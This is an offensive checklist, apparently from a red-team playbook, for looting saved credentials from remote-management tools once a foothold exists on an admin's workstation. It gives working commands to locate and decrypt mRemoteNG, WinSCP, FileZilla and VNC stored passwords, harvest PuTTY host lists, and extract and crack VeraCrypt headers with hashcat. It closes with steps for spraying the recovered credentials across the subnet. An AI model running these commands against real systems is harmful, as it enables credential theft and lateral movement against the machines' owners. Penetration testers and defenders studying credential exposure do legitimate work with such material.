# Remote Manager Looting

## Before I start
- [ ] Foothold on an admin's workstation or jumpbox — the prize is their saved sessions: :Pb windows-creds

## mRemoteNG
dir /s /b C:\Users\*\confCons.xml
python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -f confCons.xml
- [ ] Default master password mR3m covers most installs; garbage output = custom password → mremoteng2john + targeted crack
- [ ] Also check Documents/Desktop/file shares — admins export confCons backups

## WinSCP / FileZilla / PuTTY
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
type %APPDATA%\FileZilla\recentservers.xml
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
- [ ] WinSCP passwords: reversible cipher → winscp_decrypt PoC
- [ ] FileZilla: base64 (or plaintext) — decode and done
- [ ] PuTTY stores no passwords but leaks every host+username = spray list: :Pb spraying

## VNC
reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password
reg query "HKLM\SOFTWARE\RealVNC\vncserver" /v Password
- [ ] Fixed DES key — any vnc-decrypt PoC opens it; password usually shared across the fleet

## VeraCrypt / TrueCrypt
Get-ChildItem -Path C:\ -Recurse -Include *.hc,*.tc -ErrorAction SilentlyContinue
dd if=container.hc of=vc.hash bs=512 count=1
hashcat -m 13721 vc.hash targeted.txt
- [ ] Slowest modes in hashcat — tiny targeted list or skip

## Next
- [ ] Every recovered cred → SMB/WinRM/RDP sweep across the subnet: :Pb lateral-movement
- [ ] Root creds for infra boxes → :Pb linux-creds on those hosts
